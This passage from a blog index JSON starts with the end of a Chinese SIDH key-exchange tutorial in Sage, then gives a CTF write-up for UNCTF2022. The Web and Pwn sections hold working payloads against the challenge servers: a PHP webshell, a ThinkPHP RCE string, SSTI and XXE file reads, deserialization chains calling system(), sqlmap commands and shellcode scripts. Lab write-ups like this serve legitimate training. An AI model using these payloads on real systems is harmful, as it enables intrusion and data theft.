\\phi_A(P_B) + t_B \\phi_A(Q_B)$； 由此可计算得 $E_{AB}$ ； 最后冲顶的一步，计算秘密值。首先要明确，很可能 $E_{BA} \\ne E_{AB}$，但是，$E_{BA}$ 同构于 $E_{AB}$。利用同构曲线的一个属性：所有同构曲线的J-Invariant值相同。于是Alice和Bob分别计算这两条曲线的J-Invariant值 $J(E_{BA})$ 和 $J(E_{AB})$，这就是他们共同拥有的秘密。J-Invariant的计算定义可在标准教科书中找到，本文把它视为黑盒子使用。 Sage代码参数设置 1234567891011121314151617181920#选取一条在素域k上的超奇异椭圆曲线lA, lB = 2, 3eA, eB = 6, 7p = lA ^ eA * lB ^ eB - 1assert p.is_prime()assert p % 4 == 3k = GF(p) # 注意，这里并不是标准做法，只是因为Sage的局限不得已E = EllipticCurve(k, [1, 0]) #选取曲线EE.is_supersingular() # 看看所生成的曲线是否超奇异.print(E.j_invariant())#选取四个随机点作为公共参数points = []while len(points) != 4: p = E.random_point() if p not in points: points.append(p)PA, PB, QA, QB = pointsPA, PB, QA, QB Alice 的操作 12345678910111213141516#Alice选择两个随机数并计算自己的秘密值RA#RA定义了phi_A的kernelsA, tA = 123, 525RA = sA * PA + tA * QAprint(RA)#phiA就是同源也是群同态phiA = E.isogeny(RA)#Alice的公共信息EAEA = phiA.codomain()print(E.is_isogenous(EA)) # 确认EA与E同源#Alice发送以下信息给BobEA, phiA_PB, phiA_QB = EA, phiA(PB), phiA(QB)EA, phiA_PB, phiA_QB Bob 的操作 123456789101112131415#Bob的工作类似sB, tB = 812, 580RB = sB * PB + tB * QBprint(RB)#phiB就是从E到EB同态映射,Kernel是RBphiB = E.isogeny(RB)#Bob的公共信息EBEB = phiB.codomain()print(E.is_isogenous(EB)) # 确认EB与E同源# Bob发送以下信息给AliceEB, phiB_PA, phiB_QA = EB, phiB(PA), phiB(QA)EB, phiB_PA, phiB_QA 秘密值计算 1234567891011121314151617# Alice计算秘密值R_BA = sA * phiB_PA + tA * phiB_QAprint(R_BA)phiBA = EB.isogeny(R_BA)print(phiBA)KA = phiBA.codomain().j_invariant()# Bob计算秘密值R_AB = sB * phiA_PB + tB * phiA_QBprint(R_AB)phiAB = EA.isogeny(R_AB)print(phiAB)KB = phiAB.codomain().j_invariant()#测试秘密值是否相等if KA == KB: print(&quot;Success!&quot;) Castryck-Decru攻击参考： An efficient key recovery attack on SIDH Castryck-Decru Key Recovery Attack on SIDH","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"后量子密码","slug":"后量子密码","permalink":"https://lazzzaro.github.io/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/"}],"author":"Lazzaro"},{"title":"UNCTF2022-公开赛","slug":"match-UNCTF2022-公开赛","date":"2022-11-18T11:43:08.000Z","updated":"2022-11-20T17:32:45.560Z","comments":true,"path":"2022/11/18/match-UNCTF2022-公开赛/","link":"","permalink":"https://lazzzaro.github.io/2022/11/18/match-UNCTF2022-%E5%85%AC%E5%BC%80%E8%B5%9B/","excerpt":"","text":"​ 为深入贯彻习近平总书记关于二十大提出的网络强国的重要思想，围绕建设网络强国的战略部署，建设网络强国的战略部署要与“两个一百年”奋斗目标同步推进，由御之安承办UNCTF2022网络安全大赛（以下简称“大赛”）将于今年11月份召开，以赛事为契机，提升网络安全保障能力，汇聚高端网络安全人才，共筑网络安全防线，为中国网络安全事业发展提供智力支撑和保障。 线上报名：2022年10月24日10:00-11月11日10:00，比赛时间：2022年11月12日12:00-11月18日12:00 Rank: 1 # Web我太喜欢bilibili大学啦phpinfo页面环境变量中直接泄露flag。 ​ ezgame 简单的游戏~ 打过boss就能获得flag F12查看js，在main.js里搜索 unctf，在混淆js代码中找到flag片段，连接起来得：unctf&#123;c5f9a27d-6f88-49fb-a510-fe7b163f8dd3&#125;。 ​ 签到 又是一道简单的签到 F12发现注释有学号 20200101 为账号密码，尝试 20200102/20200103/20200104/20200105 分别回显 f/l/a/g，脚本遍历提取： 123456789import requestsurl = &#x27;http://365172a3-2701-4e1a-8f59-a548f14e7027.node.yuzhian.com.cn/index.php&#x27;flag = &#x27;&#x27;for i in range(20200102,20200102+40): data = &#123;&#x27;username&#x27;:f&#x27;&#123;i&#125;&#x27;,&#x27;password&#x27;:&#x27;&#x27;&#125; r = requests.post(url,data=data) flag += r.text[-5][0] print(flag) ​ babyphp弱类型比较。第一层，16进制0x绕过；第二层，数组绕过；第三层，用其他命令和通配符绕过RCE。 Payload： /index.php?code=print_r(exec(&quot;uniq%09/fl*&quot;));，POST：a=0x&amp;key1[]=a&amp;key2[]=b ​ easy_upload 简简单单的文件上传 无过滤的文件上传。上传一个 1.php，内含 &lt;?php system($_GET[x]);，再访问传入命令RCE。 Payload：/uplO4d/1.php?x=cat%20/home/ctf/flag ​ 给你一刀ThinkPHP 5.0.x未开启强制路由RCE漏洞。 Payload: ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=env flag: UNCTF&#123;Y0u_A3r_so_G9eaD_hacker&#125; ​ 302与深大 thai想让你知道szu的战队……吗，醒醒，这个页面不是主页！ Request头的考察。 123/?miku=puppyPOST: micgo=ikunCookie: admin=true flag: UNCTF&#123;thai_miku_micgo_qka_WEB_GOD&#125; ​ easy ssti php看腻了，来点python吧 基本无过滤的SSTI。 Payload： /register，POST：user=&#123;&#123;cycler.__init__.__globals__.os.popen('env').read()&#125;&#125;&amp;pwd= ​ 听说php有一个xxeXXE。先访问 /hint，再访问 /dom.php，根据 DOMDocument::loadXML()信息，POST一个XML数据读flag： 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [ &lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt; ​ ezunseri 好像还没有反序列化的题目？ 反序列化链：Login:__destruct() =&gt; Exec:__get() =&gt; Test:__toString() =&gt; Exec:__invoke() =&gt; Exec:execute() 构造： 1234567891011121314151617181920212223from phpserialize import serializefrom urllib.parse import quoteclass Exec: public_content=&#x27;system(&quot;cat /flag&quot;);&#x27; class Test: public_test=Exec() public_key=&#x27;?&#x27; class Exec: public_content=Test() class Login: private_name=&#x27;&#x27; public_code=&#x27;3.1415926&#x27; public_key=Exec()print(quote(serialize(Login())))# O%3A5%3A%22Login%22%3A3%3A%7Bs%3A11%3A%22%00Login%00name%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22code%22%3Bs%3A9%3A%223.1415926%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A1%3A%22%3F%22%3Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%22cat%20/flag%22%29%3B%22%3B%7D%7D%7D%7D# 绕__wakeup():# O%3A5%3A%22Login%22%3A4%3A%7Bs%3A11%3A%22%00Login%00name%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22code%22%3Bs%3A9%3A%223.1415926%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A1%3A%22%3F%22%3Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%22cat%20/flag%22%29%3B%22%3B%7D%7D%7D%7D ​ poppop反序列化链：B:__destruct() =&gt; C:__toString() =&gt; A:__call() 构造： 1234567891011121314151617from phpserialize import serializefrom urllib.parse import quoteclass A: public_code=&#x27;system(&quot;env&quot;);&#x27;; class C: private_key2=A() class B: public_key=C() print(quote(serialize(B()))) # O%3A1%3A%22B%22%3A1%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%22env%22%29%3B%22%3B%7D%7D%7D# 绕__wakeup():# O%3A1%3A%22B%22%3A2%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%22env%22%29%3B%22%3B%7D%7D%7D ​ babynode 你能污染对象吗 原型链污染。 Payload： POST： &#123;&quot;__proto__&quot;:&#123;&quot;id&quot;:&quot;unctf&quot;&#125;&#125; ​ easy_rce rce布尔盲注 无回显RCE，可以采用 if+head+cut+sleep 方式逐位猜解flag各个字符。 123456789101112131415161718192021222324import requestsimport stringimport timeurl = &#x27;http://c88b47e2-7088-4011-8d20-f4e5677e765e.node.yuzhian.com.cn/?code=&#x27;dic = string.ascii_letters+string.digits+&#x27;&#123;-&#125;&#x27;flag = &#x27;&#x27;for i in range(1,50): judge = 0 for j in dic: now = f&#x27;&#123;url&#125;a=$(tac /f?ag | head -1 | cut -b &#123;i&#125;)%0aif [ $a = &#123;j&#125; ]%0athen sleep 2%0afi&#x27; start = time.time() r = requests.get(now) end = time.time() if int(end)-int(start) &gt; 1: judge = 1 flag += j print(flag) break if judge == 0: break print(flag) ​ 随便注 好像见过，又好像不是 sqlmap能跑出： 12345sqlmap -u &quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot; --dbssqlmap -u &quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot; -D ctftraining --tablessqlmap -u &quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot; -D ctftraining -T FLAG_TABLE --sql-shellsql-shell&gt; select load_file(&quot;/flag&quot;); ​ ez2048F12在game.js内查看关键代码，为首页invite_code验证逻辑： 1234567891011121314151617181920212223242526272829303132333435363738checkInvited() &#123; let args = [...arguments]; let buf = new ArrayBuffer(24); const view = new DataView(buf); view.setUint8(0, 68); view.setUint8(1, 51); view.setUint8(2, 15); view.setUint8(3, 80); view.setUint16(4, 0x0e5d, true); view.setUint16(6, 0x323a, true); view.setUint16(8, 0x3058, true); view.setUint16(10, 0x1a2a, true); view.setUint32(12, 0x0512160d, true); view.setUint32(16, 0x02560002); view.setUint32(20, 0x130000); function check(code) &#123; if (code.length !== 24) return false; let encode = []; for (let i = 0; i &lt; code.length; i++) &#123; if (~i % 2 === 0) &#123; encode.push(code.charCodeAt(i) ^ code.charCodeAt(i - 2)); &#125; else &#123; encode.push(code.charCodeAt(i) ^ code.charCodeAt(i + 1)); &#125; &#125; for (let i = 0; i &lt; code.length; i++) &#123; if (view.getInt8(i) !== encode[i]) return false; &#125; return true; &#125; return function () &#123; if (!!arguments.length) &#123; [].push.apply(args, arguments); return arguments.callee; &#125; return check(args.join(&quot;&quot;)); &#125;; &#125; 写简单脚本还原输入： 1234567891011121314c = [68,51,15,80,93,14,58,50,88,48,42,26,13,22,18,5,2,86,0,2,0,19,0,0]print(len(c))t = [-1]*24t[1] = c[1]t[0] = t[1]^c[0]for i in range(3,24,2): t[i] = t[i-2]^c[i] t[i-1] = t[i]^c[i-1]print(bytes(t))# b&#x27;w3lc0me_7o_unctf2022!!!!&#x27; 再观察发现存在game.wasm，使用wabt工具逆wasm得到密文 \\x22&#125;/7v\\x16\\x0d&gt;GV&amp;*\\x5cS@^mWS_D~V\\x10\\x03[3\\x16^\\x0eR9\\x05_mG\\x10\\x1efalse\\x00，尝试与前面得到的invite_code异或，得到 UNCTF&#123;hap9y_2048_game_w1th_unc7f2022~&#125;..^CW2。 ​ 世界和平 提示1：堆叠注入 根据提示进行堆叠注入： 123450;show databases;#数据库名 score_mbamission/score_minnesotaunited/snert0;show tables;# 表名 Flag/users 使用 0;select * from Flag 查找Flag表中内容，发现无回显，猜测对 select 或 from 或 Flag 有过滤。 尝试 0;seLseLectect version();#，只用 select 大写+双写可以绕过得到内容，则 再用 0;seLseLectect * fRfRomom FlFlagag;# 即可拿到flag。 ​ 快乐三消 打CTF累了来玩三消放松一下叭 查看源码，除了进入 /h5/index.php 和 /h4/king.php，没有其他有用信息。 扫目录发现 /.git/ 和 /admin/，用GitHack还原出 index.php 和 phpinfo.php，无有用信息。 用 admin/unctf 进入后台页面， 在网页预览功能发现url为 /admin/fi.php?filename=index.php，尝试发现存在文件包含漏洞，访问 /admin/fi.php?filename=/flag 得到flag。 ​ # PwnwelcomeUNCTF2022 easy easy easy Pwn 签到pwn。 12345from pwn import *r = remote(&#x27;node.yuzhian.com.cn&#x27;,37591)r.sendline(&#x27;UNCTF&amp;2022\\x00&#x27;)r.sendline(&#x27;cat /flag&#x27;)print(r.recvall()) ​ 石头剪刀布伪随机数组，给了srand种子值，依照代码逻辑求出固定种子值下的100个rand值： [1,1,2,2,0,2,2,1,2,2,2,2,0,0,2,1,0,1,2,0,0,1,1,1,1,2,1,1,1,0,0,2,0,1,2,0,0,1,0,2,1,2,1,2,0,1,1,1,0,0,2,0,2,1,2,1,0,0,2,2,1,1,2,1,2,2,2,2,1,0,2,0,2,0,0,1,2,2,2,0,0,1,0,1,0,0,2,0,1,0,0,2,1,1,1,1,0,1,1,2] 再根据石头剪刀布规则完成后半部分交互： 123456789101112131415161718192021from pwn import *r = remote(&#x27;node.yuzhian.com.cn&#x27;,30253)rand = [1,1,2,2,0,2,2,1,2,2,2,2,0,0,2,1,0,1,2,0,0,1,1,1,1,2,1,1,1,0,0,2,0,1,2,0,0,1,0,2,1,2,1,2,0,1,1,1,0,0,2,0,2,1,2,1,0,0,2,2,1,1,2,1,2,2,2,2,1,0,2,0,2,0,0,1,2,2,2,0,0,1,0,1,0,0,2,0,1,0,0,2,1,1,1,1,0,1,1,2]need = []for i in range(100): if rand[i] == 0: need.append(2) elif rand[i] == 1: need.append(0) elif rand[i] == 2: need.append(1)r.recvuntil(&#x27;pwn later?(y/n)\\n&#x27;)r.sendline(&#x27;y&#x27;)for i in range(100): print(r.recvuntil(&#x27;]\\x1B[0m\\n&#x27;)) r.sendline(str(need[i])) print(i,r.recvline())r.interactive() ​ checkin测试符合条件的数： 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef unsigned int uint32;#define _DWORD uint32#define LODWORD(x) (*((_DWORD*)&amp;(x)))int main()&#123; size_t nbytes; char nptr[32]=&quot; -33&quot;; LODWORD(nbytes) = atoi(nptr); printf(&quot;%d\\n&quot;,atoi(nptr)); printf(&quot;%x\\n&quot;,nptr[0]); if ( atoi(nptr) &gt; 32 || nptr[0] == 0x2D ) &#123; puts(&quot;No!!Hacker&quot;); &#125; printf(&quot;%u&quot;,(unsigned int)nbytes); return 0;&#125; 交互： 123456789101112from pwn import *r = remote(&#x27;node.yuzhian.com.cn&#x27;,39482)r.recvuntil(&#x27;name: \\n&#x27;)r.send(&#x27;xx&#x27;)r.recvuntil(&#x27;size: \\n&#x27;)r.send(&#x27; -33&#x27;)pl = &#x27;a&#x27;*(0x50+8)+p64(0x4008c3)r.send(pl)r.interactive() ​ int 0x80 easy easy easy Pwn ret2shellcode，其中的 __ctype_b_loc 函数的作用可参考 ctype/ctype.h 源码，将输入的字符根据 ((bit) &lt; 8 ? ((1 &lt;&lt; (bit)) &lt;&lt; 8) : ((1 &lt;&lt; (bit)) &gt;&gt; 8)) 进行处理，然后根据下面表对应的内容返回。参考 2021 天翼杯 pwn ezshell。 s[i] &amp; 0x4000 != 0 意思即要求的输入字符是可见字符。 参考 mrctf2020_shellcode_revenge，使用全可见字符shellcode输入即可： 12345678910from pwn import *r = remote(&#x27;node.yuzhian.com.cn&#x27;,32261)r.recvline()r.send(&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;)r.interactive()# UNCTF&#123;h3ll0_w_0_r_1_d&#125; ​ # Reversewhereisyourkey 你能找到属于你的key吗？ 简单替换加密。 1234567891011s = [121, 101, 115, 105, 97, 107, 102, 108, 97, 103]for i in range(len(s)): if s[i] == 109: pass elif s[i] &lt;= 110: s[i] -= 2 elif s[i] &gt; 111: s[i] += 3print(bytes(s))# b&#x27;yesiamflag&#x27; ​ ezzzzre re签到题 exeinfo发现UPX壳，脱壳后，IDA中分析逻辑，顺着实现得flag： 12345s = list(b&#x27;HELLOCTF&#x27;)out = [2*k-69 for k in s]print(bytes(out))# b&#x27;KESSYAcG&#x27; ​ Sudoku数独判定逻辑。直接运行显示的数独是错的，动调获取正确的数独初始数组，找个在线网站解了后填入为： [8, 5, 2, 4, 9, 1, 6, 7, 3, 1, 9, 6, 7, 3, 8, 2, 5, 4, 4, 3, 7, 5, 6, 2, 9, 1, 8, 5, 2, 8, 1, 4, 6, 3, 9, 7, 3, 7, 4, 9, 2, 5, 8, 6, 1, 9, 6, 1, 3, 8, 7, 4, 2, 5, 2, 1, 9, 8, 5, 4, 7, 3, 6, 7, 4, 3, 6, 1, 9, 5, 8, 2, 6, 8, 5, 2, 7, 3, 1, 4, 9] 依次输入后得到 Y0u_Ar3_R1ght!Th1s_1s_your_f1aaag! UNCTF&#123;chr(29+vme)chr(15+vme)chr(29+vme)chr(24+vme)chr(39+vme)chr(25+vme)chr(29+vme)chr(20+vme)chr(32+vme)&#125; 其中 vme=50，即flag：UNCTF&#123;OAOJYKOFR&#125;。 ​ haloexeinfo发现UPX壳，脱壳后，IDA中分析逻辑，为两轮异或，还原： 12345678910111213141516s = [85, 11, 104, 12, 115, 62, 12, 58, 93, 27, 33, 117, 79, 32, 76, 113, 88, 123, 89, 44, 0, 119, 88, 119, 14, 114, 91, 38, 11, 112, 10, 119, 102, 119, 54, 118, 55, 118, 98, 114, 109, 39, 63, 119, 38, 38]s = [s[i]^0x33 for i in range(len(s))]print(s)for i in range(len(s)-1,0,-1): s[i] ^= s[i-1]^iprint(bytes(s))# b&#x27;f_ag&#123;H41oO0_6bb2920f8b98ae3f1fdb10cced277c2c&#125;-&#x27;# 修正：flag&#123;H41oO0_6bb2920f8b98ae3f1fdb10cced277c2c&#125; ​ HelloRust 快来逆逆这一坨答辩罢 IDA打开，分析代码逻辑，识别为RC4算法，找到密文hex值 876927216FC731261B6C3A749A626EA002811D85E0E2D071F4A3090E，以及key值 UnCtF2022， 使用Cyberchef得到flag明文：unctf&#123;Ru5t_Rc4_1s_2_e@zy!!!&#125;。 ​ ezast 你会ast吗 JavaScript抽象语法树（AST），定位密文 OTYN\\\\\\\\a[inE+iEl.hcEo)ivo+g，且中间运算包含异或操作，尝试使用Cyberchef异或爆破，发现在key=0x1a时，得到flag：UNCTF&#123;Ast_1s_v4ry_u3slu1&#125;。 ​ HUAQIANG深育杯原题 生瓜蛋子，参考官方wp，代码逻辑为一个VM，逐位爆破flag每位的可行值，得到满足条件的输入：998bc64bbd919f27f44e5e2750644c。 ​ # Cryptomd5-1爆破可见字符得到md5表，再依次遍历密文取出相应字符。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from hashlib import md5c = &#x27;&#x27;&#x27;4c614360da93c0a041b22e537de151eb8d9c307cb7f3c4a32822a51922d1ceaa0d61f8370cad1d412f80b84d143e1257b9ece18c950afbfa6b0fdbfa4ff731d3800618943025315f869e4e1f09471012f95b70fdc3088560732a5ac135644506e1671797c52e15f763380b45e841ec32c9f0f895fb98ab9159f51fd0297e236da87ff679a2f3e71d9181a67b7542122c8fa14cdd754f91cc6554c9e71929cce7e1671797c52e15f763380b45e841ec328277e0910d750195b448797616e091adcfcd208495d565ef66e7dff9f98764dac81e728d9d4c2f636f067f89cc14862cc9f0f895fb98ab9159f51fd0297e236d92eb5ffee6ae2fec3ad71c777531578f45c48cce2e2d7fbdea1afc51c7c6ad26cfcd208495d565ef66e7dff9f98764daa87ff679a2f3e71d9181a67b7542122c1679091c5a880faf6fb5e6087eb1b2dc8fa14cdd754f91cc6554c9e71929cce74a8a08f09d37b73795649038408b5f33cfcd208495d565ef66e7dff9f98764dae1671797c52e15f763380b45e841ec32c9f0f895fb98ab9159f51fd0297e236d8fa14cdd754f91cc6554c9e71929cce7cfcd208495d565ef66e7dff9f98764dac9f0f895fb98ab9159f51fd0297e236dcfcd208495d565ef66e7dff9f98764dae1671797c52e15f763380b45e841ec3245c48cce2e2d7fbdea1afc51c7c6ad261679091c5a880faf6fb5e6087eb1b2dce1671797c52e15f763380b45e841ec328f14e45fceea167a5a36dedd4bea2543c81e728d9d4c2f636f067f89cc14862cc4ca4238a0b923820dcc509a6f75849bc9f0f895fb98ab9159f51fd0297e236da87ff679a2f3e71d9181a67b7542122ccbb184dd8e05c9709e5dcaedaa0495cf&#x27;&#x27;&#x27;.split(&#x27;\\n&#x27;)s = list(range(32,127))t = &#123;&#125;for k in s: t[md5(chr(k).encode()).hexdigest()] = chr(k)flag=&#x27;&#x27;for k in c: flag += t[k]print(flag)# UNCTF&#123;e84fed028b9046fc0e8f080e96e72184&#125; ​ dddd1换为 .，0换为 -，摩斯密码解密得：UNCTF&#123;Y4S_TH1S_JUST_M0RSE&#125;。 ​ caesarROT64变种凯撒密码，用脚本还原： 123456789101112131415161718import strings = &#x27;B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY_&#125;&#x27;dic = string.ascii_uppercase+string.ascii_lowercase+string.digits+&#x27;+/&#x27;print(dic)d = ord(&#x27;U&#x27;)-ord(&#x27;B&#x27;)t = &#x27;&#x27;for i in range(len(s)): if s[i] == &#x27;&#123;&#x27; or s[i] == &#x27;&#125;&#x27; or s[i] == &#x27;_&#x27;: t += s[i] else: t += dic[(dic.index(s[i])+d)%64]print(t)# UNCTF&#123;w0w_Th1s_d1fFerent_c4eSar_&#125; ​ md5-2比md5-1多了一层异或操作，还原即可。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from hashlib import md5c = &#x27;&#x27;&#x27;4c614360da93c0a041b22e537de151ebc1fd731c6d60040369908b4a5f309f4180fdc84bbb5ed9e207a21d5436efdcfdb48d19bb99a7e6bb448f63b75bc9238439eaf918a52fcaa5ed9195e546b021c1795d6869f32db43ff5b414de3c235514f59a054403f933c842e9c3235c136367c80b37816048952a3c0fc9780602a2fa810ecef68e945c3fe7d6accba8b329bdcad06891e0c769c7b02c228c8c2c8865470a96d253a639193530a15487fea36f470a96d253a639193530a15487fea36f4bdea6676e5335f857fa8e47249fa1d8810ecef68e945c3fe7d6accba8b329bdedbb7ab78cde98a07b9b5a2ab284bf0a44b43e07e9af05e3b9b129a287e5a8dfa641c08ed66b55c9bd541fe1b22ce5c0abed1f675819a2c0f65c9b7da8cab301738c486923803a1b59ef17329d70bbbd7e209780adf2cd1212e793ae8796ed7ca641c08ed66b55c9bd541fe1b22ce5c0a641c08ed66b55c9bd541fe1b22ce5c0636a84a33e1373324d64463eeb8e76146ec65b4ab061843b066cc2a2f16820d5a4a39b59eb036a4a8922f7142f8741148c34745bd5b5d42cb3efe381eeb88e4b5b1ba76b1d36847d632203a75c4f74e2d861570e7b9998dbafb38c4f35ba08bc464b7d495dc6019fa4a709da29fc79528eb69528cd84b73d858be0947f97b7ccdd6ac4c783a9059d11cb0910fc95d4a4b6b0ee5d5f6b24e6898997d765c487cb0762bc356c466d6b2b8f6396f2e0418547287408e2d2d8f3834fc1b90c3be982947a7d007b9854fa62efb18c9fd91f8ddafe43b36150de851c83d80bd22b0ac7b36c5f23587e285e528527d1263c8b2a0816e8af86e68825c9df0d63a2838163ce72a42cf62e6d0fdc6c96df4687e3&#x27;&#x27;&#x27;.split(&#x27;\\n&#x27;)cc = [int(k,16) for k in c]for i in range(1,len(cc)): cc[i] ^= cc[i-1] cc = [hex(k)[2:].rjust(32,&#x27;0&#x27;) for k in cc]print(cc)s=list(range(32,127))t=&#123;&#125;for k in s: t[md5(chr(k).encode()).hexdigest()]=chr(k)flag = &#x27;&#x27;for k in cc: flag += t[k]print(flag)# UNCTF&#123;a197271943ceb3c3fe98bcadf10c29d4&#125; ​ ezRSA常规RSA。 1234567891011import gmpy2n = 62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561e = 65537c = 56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504p = gmpy2.iroot(n,4)[0]f = p**3*(p-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;unctf&#123;pneum0n0ultram01cr0sc0p01cs01l01c0v0lcan0c0n010s01s&#125;&#x27; ​ Single table读加密方式，明显的playfair密码。 按照key排列好字母表，手动把每两个字母取出解密后，排列为 UNCTFGODYOUKNOWPLAYFAIRX，在适当的地方加符号分割单词：UNCTF&#123;GOD_YOU_KNOW_PLAYFAIR&#125;。 ​ Multi table变表维吉尼亚密码，先根据前4字符确定key值，再遍历爆破。 1234567891011121314151617181920212223242526272829303132333435from string import ascii_uppercasebase_table = [&#x27;J&#x27;, &#x27;X&#x27;, &#x27;I&#x27;, &#x27;S&#x27;, &#x27;E&#x27;, &#x27;C&#x27;, &#x27;R&#x27;, &#x27;Z&#x27;, &#x27;L&#x27;, &#x27;U&#x27;, &#x27;K&#x27;, &#x27;Q&#x27;, &#x27;Y&#x27;, &#x27;F&#x27;, &#x27;N&#x27;, &#x27;V&#x27;, &#x27;T&#x27;, &#x27;P&#x27;, &#x27;O&#x27;, &#x27;G&#x27;, &#x27;A&#x27;, &#x27;H&#x27;, &#x27;D&#x27;, &#x27;W&#x27;, &#x27;M&#x27;, &#x27;B&#x27;]table=&#123;&#125;for i in range(26): table[i]=ascii_uppercase[i:]+ascii_uppercase[:i]ori = &#x27;UNCT&#x27;res = &#x27;SDCG&#x27;key = []for i in range(4): for k,v in table.items(): if v[base_table.index(ori[i])] == res[i]: key.append(k) breakprint(key)c = &#x27;SDCGW&#123;MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD&#125;&#x27;flag = &#x27;&#x27;x = 0for i in range(len(c)): if c[i] in ascii_uppercase: now = table[key[x%4]].index(c[i]) flag += base_table[now] x += 1 else: flag += c[i]print(flag)# [9, 15, 23, 16]# UNCTF&#123;WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER&#125; ​ babyRSA泄露 $m$ 高位的Coppersmith攻击。 1234567891011121314n = 25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431c = 15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107e = 6 mbar = 11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240kbits = 60nbits = n.nbits()print(&quot;upper &#123;&#125; bits of &#123;&#125; bits is given&quot;.format(nbits - kbits, nbits))PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (mbar + x)^e - cx0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root &lt; 2^kbits with factor = nm = mbar + x0print(bytes.fromhex(hex(m)[2:]))# b&#x27;UNCTF&#123;27a0aac7-76cb-427d-9129-1476360d5d1b&#125;&#x27; ​ easy_RSA泄露 $p$ 高位的Coppersmith攻击。 12345678910111213141516171819c = 6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140n = 102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553p4 = 8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857e = 0x10001pbits = 512kbits = 200print(p4.nbits())p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4roots = f.small_roots(X=2^kbits, beta=0.4)p = p4+int(roots[0]) q = n//pf = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# flag&#123;It is a very_intersting_test!!!&#125; ​ ezxor 你知道多次一密吗？ 多次一密（MTP）攻击。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# python2import stringimport collectionsimport sets, sysciphers = 